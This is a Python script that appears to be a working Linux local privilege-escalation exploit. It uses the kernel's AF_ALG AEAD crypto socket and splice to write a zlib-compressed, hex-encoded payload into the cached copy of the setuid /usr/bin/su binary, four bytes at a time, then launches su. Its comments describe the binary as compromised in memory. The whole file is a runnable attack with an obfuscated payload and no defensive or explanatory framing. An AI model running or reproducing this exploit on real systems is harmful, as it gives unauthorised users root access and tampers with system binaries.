#!/usr/bin/env python3
import os
import zlib
import socket
import struct

# Constants for AF_ALG (Linux Kernel Crypto API)
AF_ALG = 38
SOL_ALG = 279

# Socket Options for ALG
ALG_SET_KEY = 1
ALG_SET_OP = 2
ALG_SET_IV = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5

# Operation types
ALG_OP_DECRYPT = 0
ALG_OP_ENCRYPT = 1


def send_crypto_msg(su_file_fd, offset, payload_chunk):
    """
    Performs a kernel-space crypto operation using the AF_ALG interface
    and splices data into the kernel pipeline.
    """
    # Create the AF_ALG socket
    sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)

    # Bind to the Authenticated Encryption with Associated Data (AEAD) algorithm
    algo_name = "authencesn(hmac(sha256),cbc(aes))"
    sock.bind(("aead", algo_name))

    # Set the key for the algorithm (the hex string converted to bytes)
    key_data = bytes.fromhex("0800010000000010" + "0" * 64)
    sock.setsockopt(SOL_ALG, ALG_SET_KEY, key_data)

    # Set the AEAD authentication tag size
    sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)

    # Accept to create an operational socket
    op_sock, _ = sock.accept()

    # Prep control messages for sendmsg
    # 1. Set IV (Initialization Vector)
    # 2. Set Operation (Encrypt/Decrypt)
    # 3. Set Associated Data Length
    iv = b"\x00" * 4
    op_type = struct.pack("I", ALG_OP_DECRYPT)  # Example op
    assoc_len = struct.pack("I", 8)

    ancillary_data = [
        (SOL_ALG, ALG_SET_IV, b"\x10" + b"\x00" * 19),
        (SOL_ALG, ALG_SET_OP, op_type),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, assoc_len),
    ]

    # Send the payload chunk with metadata
    msg_body = b"A" * 4 + payload_chunk
    op_sock.sendmsg([msg_body], ancillary_data, 0, 32768)

    # Use splice to move data between the file and the socket in kernel space
    # This avoids copying data to user-space
    pipe_read, pipe_write = os.pipe()
    total_len = offset + 4

    os.splice(su_file_fd, pipe_write, total_len, offset_src=0)
    os.splice(pipe_read, op_sock.fileno(), total_len)

    try:
        # Attempt to receive the processed data
        op_sock.recv(8 + offset)
    except Exception:
        pass
    finally:
        op_sock.close()
        sock.close()


# --- Main Execution ---

# Open a setuid binary (su) to target for the memory manipulation
try:
    su_fd = os.open("/usr/bin/su", os.O_RDONLY)
except OSError:
    print("Could not open /usr/bin/su")
    exit(1)

# Decompress the binary payload
hex_payload = (
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e0"
    "7e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979"
    "fac5190c0c0c0032c310d3"
)
decompressed_payload = zlib.decompress(bytes.fromhex(hex_payload))

# Iterate through the payload in 4-byte increments
for i in range(0, len(decompressed_payload), 4):
    chunk = decompressed_payload[i : i + 4]
    send_crypto_msg(su_fd, i, chunk)

# Final step: Execute su, which may now be compromised in memory
os.system("su")
